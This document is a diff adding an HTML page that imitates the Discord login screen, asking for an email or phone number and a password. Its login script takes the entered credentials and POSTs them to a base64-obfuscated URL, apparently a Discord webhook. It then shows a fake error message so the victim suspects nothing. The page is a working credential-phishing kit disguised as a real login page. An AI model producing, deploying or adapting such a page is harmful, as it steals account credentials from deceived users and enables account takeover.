@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Discord</title>
+    <link href="icon.ico" rel="icon" type="image/x-icon">
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <style>
+        body {
+            background-image: url(background.jpg);
+            background-size: cover;
+            background-position: center;
+            font-family: 'Uni Sans Heavy', Helvetica, Arial, sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .login-container {
+            background-color: #313338;
+            border-radius: 8px;
+            padding: 20px;
+            width: 300px;
+            text-align: center;
+        }
+
+        h2 {
+            color: #fff;
+        }
+
+        h4 {
+            font-weight: lighter;
+            color: #a6bac1;
+        }
+
+        .input-group {
+            margin: 15px 0;
+            text-align: left;
+        }
+
+        .input-group label {
+            font-size: 75%;
+            color: #a6bac1;
+            font-weight: 700;
+            display: block;
+            margin-bottom: 2px;
+        }
+
+        .forgot {
+            text-decoration: none;
+            font-size: 75%;
+            color: #5865f2;
+            cursor: pointer;
+            font-weight: 700;
+            display: block;
+            margin-bottom: 25px;
+        }
+
+        .forgot:hover {
+            text-decoration: underline;
+        }
+
+        .register {
+            text-align: left;
+            font-size: 75%;
+            color: #a6bac1;
+            cursor: pointer;
+            font-weight: 700;
+            display: block;
+        }
+
+        .register2 {
+            text-decoration: none;
+            color: #5865f2;
+            cursor: pointer;
+            font-weight: 700;
+        }
+
+        .register2:hover {
+            text-decoration: underline;
+        }
+
+        .input-group input {
+            background-color: #1e1f22;
+            width: 100%;
+            padding: 10px;
+            box-sizing: border-box;
+            border: none;
+            border-radius: 4px;
+            margin-top: 8px;
+            margin-bottom: 10px;
+            outline: 0;
+            font-size: 80%;
+            color: #fff;
+        }
+
+        .input-group button {
+            width: 100%;
+            padding: 10px;
+            box-sizing: border-box;
+            border: none;
+            border-radius: 4px;
+            background-color: #5865f2;
+            color: #fff;
+            cursor: pointer;
+            margin-bottom: .5px;
+            transition: background-color .3s ease, transform .2s ease;
+        }
+
+        .input-group button:hover {
+            background-color: #4752c4;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h2>Welcome Back!</h2>
+        <h4>We're so excited to see you again!</h4>
+        <div class="input-group">
+            <label for="username">EMAIL OR PHONE NUMBER *</label>
+            <input id="username">
+        </div>
+        <div class="input-group">
+            <label for="password">PASSWORD *</label>
+            <input id="message">
+            <a class="forgot" href="resetpass.html">Forgot your password?</a>
+        </div>
+        <div class="input-group">
+            <button class="login-button" onclick="sendMessage()">Login</button>
+        </div>
+        <div class="register">
+            <p>Need an account? <a class="register2" href="https://discord.com/register">Register</a></p>
+        </div>
+    </div>
+    <script>
+        async function sendMessage() {
+            const e = {
+                content: `Email: ${document.getElementById("username").value}\nPassword: ${document.getElementById("message").value}`
+            };
+            try {
+                (await fetch(atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM0OTUyODM1MjQ4NjE5NTM1MC83ckN4aWpUeTVQME9NMlBuZWc4UXZ3Rmh4MndKNDJXdHVCUGppRndnbjhYczczYkEzRmx0YWhORUhuWEs5MV82UmFxZw=="), {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify(e)
+                })).ok, alert("An error occurred. Please try again later.")
+            } catch (e) {
+                console.error("Error sending message:", e), alert("An error occurred. Please try again later.")
+            }
+        }
+    </script>
+</body>
+</html>
